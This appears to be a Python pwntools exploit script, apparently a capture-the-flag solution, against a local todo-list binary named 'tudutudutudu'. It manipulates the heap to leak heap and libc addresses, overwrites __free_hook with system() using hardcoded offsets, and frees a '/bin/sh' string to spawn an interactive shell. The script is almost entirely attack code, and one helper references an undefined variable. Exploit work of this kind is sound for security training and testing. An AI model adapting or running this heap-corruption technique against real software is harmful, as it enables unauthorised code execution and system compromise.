#!/usr/bin/env python
import pwn
import re


p = pwn.process(['./tudutudutudu'])
pwn.context.terminal = ['tmux', 'splitw', '-h', '-p', '75']

la2tosys = -0x17bba0
systofreehook = 0x17cd28

def create_todo(topic, rec = 1, sen = 0):
    if rec == 1:
        p.recvuntil(">")
    p.sendline("1")
    p.recvuntil("topic:")
    if sen == 0:
        p.sendline(topic)
    else:
        p.send(topic)
    return

def set_description(topic, length, desc, rec = 1, sen1 = 0, sen2 = 0):
    if rec == 1:
        p.recvuntil(">")
    p.sendline("2")
    p.recvuntil("topic:")
    if sen1 == 0:
        p.sendline(topic)
    else:
        p.send(topic)
    p.recvuntil("length:")
    p.sendline(str(length))
    p.recvuntil("Desc:")
    if sen2 == 0:
        p.sendline(desc)
    else:
        p.send(description)
    return

def delete_todo(topic, rec = 1, sen = 0):
    if rec == 1:
        p.recvuntil(">")
    p.sendline("3")
    p.recvuntil("topic:")
    if sen == 0:
        p.sendline(topic)
    else:
        p.send(topic)
    return

def print_todos(rec = 1):
    if rec == 1:
        p.recvuntil(">")
    p.sendline("4")
    r = p.recvuntil(">")
    return r

def quit(rec = 1):
    if rec == 1:
        p.recvuntil(">")
    p.sendline("5")
    return

for i in range(9):
    create_todo("A"*0x46+str(i))
    set_description("A"*0x46+str(i), 0x57, "BBB")

for i in range(9):
    delete_todo("A"*0x46+str(i))

for i in range(8):
    create_todo("A"*0x46+str(i))

r = print_todos().split("A"*0x46+"7")[1][3:].split("\n")[0]
la = pwn.util.packing.unpack(r.ljust(8,"\x00"), 'all', endian = 'little', signed = False)
print "[+] Address on heap: "+hex(la)

create_todo("A"*0x56+"9", 0)
create_todo("B"*0x56+"9")


delete_todo("A"*0x46+"7")

sen1 = pwn.p64(la - 0x458) + pwn.p64(la - 0x1870)
sen1 = sen1.ljust(0x46, "A")

create_todo("A"*0x27)
set_description("A"*0x27, 0x57, sen1)

for i in range(7):
    delete_todo("A"*0x46+str(i))

for i in range(5):
    create_todo("B"*0x56+str(i))

sen2 = pwn.p64(0x602030).rjust(0x50, "C")

create_todo(sen2)

create_todo("X")

s1 = "A"*0x30 + pwn.p64(0x602180) + pwn.p64(la+0x70) + "D"*8 + pwn.p64(la-0x1830) + pwn.p64(0x602200)[:-1]

set_description("X", 0x57, s1)

create_todo("Y")
set_description("Y", 0x1F, pwn.p64(0x602020) + pwn.p64(0))

r = print_todos().split("-")[0][1:-1]
la2 = pwn.util.packing.unpack(r.ljust(8,"\x00"), 'all', endian = 'little', signed = False)
print "[+] stdout is at: "+hex(la2)

sys = la2 + la2tosys
freehook = sys + systofreehook

print "[+] System is at: "+hex(sys)
print "[+] Free hook is at: "+hex(freehook)

set_description("Y", 0x3f, pwn.p64(la-0x1828)+pwn.p64(freehook) + pwn.p64(0x602040),0)

create_todo(pwn.p64(sys), 1, 0)

create_todo("/bin/sh\x00")
delete_todo("/bin/sh\x00")

print "[+] Shell spawned."


p.interactive()
